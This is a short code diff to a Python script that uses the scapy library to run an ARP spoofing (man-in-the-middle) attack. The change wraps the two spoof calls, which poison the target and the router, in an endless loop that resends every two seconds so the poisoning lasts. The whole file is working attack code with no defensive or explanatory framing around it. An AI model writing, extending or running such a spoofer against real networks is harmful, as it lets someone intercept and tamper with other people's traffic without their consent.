@@ -1,4 +1,5 @@
 import scapy.all as scapy
+import time
 
 # pdst is the ip of destination
 # hwdst is the mac of destination
@@ -22,5 +23,8 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet)
 
 
-spoof("target_ip", "attacker_ip")  # first spoof target
-spoof("attacker_ip", "target_ip")  # second spoof router
+while True:
+
+    spoof("target_ip", "attacker_ip")  # first spoof target
+    spoof("attacker_ip", "target_ip")  # second spoof router
+    time.sleep(2)
